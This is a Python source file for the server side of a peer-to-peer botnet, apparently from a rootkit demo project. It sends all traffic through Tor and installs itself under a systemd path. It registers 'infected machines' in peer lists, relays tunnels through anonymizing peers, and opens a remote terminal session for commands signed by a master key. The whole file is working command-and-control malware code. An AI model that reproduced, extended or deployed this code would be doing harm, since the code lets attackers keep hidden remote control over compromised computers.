"""Server side of the p2p communication protocol"""

import os
import time
import copy
import socks
import socket
import logging
import threading
import subprocess

from botnet_p2p import BUFFER_SIZE
from botnet_p2p.operations import (
    add_new_infected_machine,
    terminal_session,
    establish_tunnel,
)
from botnet_p2p.message import breakdown_msg, signed_by_master

logging.basicConfig(level=logging.DEBUG)


NEW_NODE = 0
SHELL = 1
UPDATE_FILE = 2

SERVER_HOST = "localhost"
SERVER_PORT = 50000
TOR_SERVER_PORT = 50001
DOWN_SERVER_PORT = 40000
MAX_QUEUE = 4

base_folder = "/etc/systemd/system/rootkit_demo"
public_folder = os.path.join(base_folder, "public")
public_peer_list = os.path.join(public_folder, "peer_list")
private_peer_list = os.path.join(base_folder, "private/full_peer_list")
public_key_path = os.path.join(public_folder, "source/public_key")
process_path = os.path.join(base_folder, "process")


socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
socket.socket = socks.socksocket


def setup_server():
    logging.info("Copying pids to process file ...")
    process_thread = threading.Thread(target=write_pids_to_process_file, args=())
    process_thread.start()
    logging.info("Starting communication server ...")
    server_socket = socket.socket()
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(MAX_QUEUE)

    while True:
        client_socket, addr = server_socket.accept()
        client_thread = threading.Thread(target=talk_with_client, args=(client_socket,))
        client_thread.start()


def write_pids_to_process_file():
    with open(process_path, "w") as process_file:
        process_file.write(f"{os.getpid()}\n")
    len_file = 0
    while len_file < 2:
        os.system(
            "ps aux | grep \"http.server 40000\" | grep -v grep | awk {'print $2'} >> "
            + process_path
        )
        time.sleep(5)
        with open(process_path, "r") as process_file:
            len_file = len(process_file.readlines())


def talk_with_client(client_socket: socket.socket) -> None:
    """ Keep the connection alive with the client and exchange
        messages

        Args:
            client_socket: Socket used to talk with the client
    """
    logging.info("New client connected...")
    coded_msg = client_socket.recv(BUFFER_SIZE)
    msg_info = breakdown_msg(coded_msg)

    num_anonymizers = msg_info["num_anonymizers"]
    msg_type = msg_info["msg_type"]
    msg = msg_info["msg"]

    if num_anonymizers < 0:
        client_socket.close()
    elif num_anonymizers != 0:
        establish_tunnel(client_socket, private_peer_list, TOR_SERVER_PORT, msg_info)
    else:
        if msg_type == NEW_NODE and not msg_requires_to_be_signed(msg_type):
            add_new_infected_machine(msg, public_peer_list, private_peer_list)
        else:
            if signed_by_master(coded_msg, public_key_path):
                logging.info("The message was signed by the master")
                if msg_type == SHELL:
                    terminal_session(client_socket, public_key_path)
            else:
                logging.info("Someone is trying to break in")


def msg_requires_to_be_signed(msg_type: int) -> bool:
    return msg_type != NEW_NODE


setup_server()
